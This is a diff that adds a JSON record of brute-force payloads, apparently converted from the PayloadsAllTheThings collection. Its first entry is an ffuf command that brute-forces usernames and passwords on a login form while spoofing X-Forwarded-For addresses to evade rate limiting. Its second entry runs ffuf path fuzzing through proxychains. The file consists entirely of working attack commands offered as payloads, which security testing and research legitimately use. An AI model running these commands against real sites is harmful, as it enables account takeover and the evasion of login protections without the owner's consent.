@@ -1,0 +1,27 @@
+{
+  "source": "PayloadsAllTheThings",
+  "exploit_type": "brute_force_rate_limit",
+  "original_category": "Brute Force Rate Limit",
+  "payloads": [
+    {
+      "category": "FFUF",
+      "escalation": "baseline",
+      "lines": [
+        "ffuf -w usernames.txt:USER -w passwords.txt:PASS \\",
+        "-u https://target.tld/login \\",
+        "-X POST -d \"username=USER&password=PASS\" \\",
+        "-H \"Content-Type: application/x-www-form-urlencoded\" \\",
+        "-H \"X-Forwarded-For: FUZZ\" -w ipv4-list.txt:FUZZ \\",
+        "-mc all"
+      ]
+    },
+    {
+      "category": "Network IPv4",
+      "escalation": "baseline",
+      "lines": [
+        "proxychains ffuf -w wordlist.txt -u https://target.tld/FUZZ"
+      ]
+    }
+  ],
+  "converted_at": "2026-04-03T07:48:28.867Z"
+}
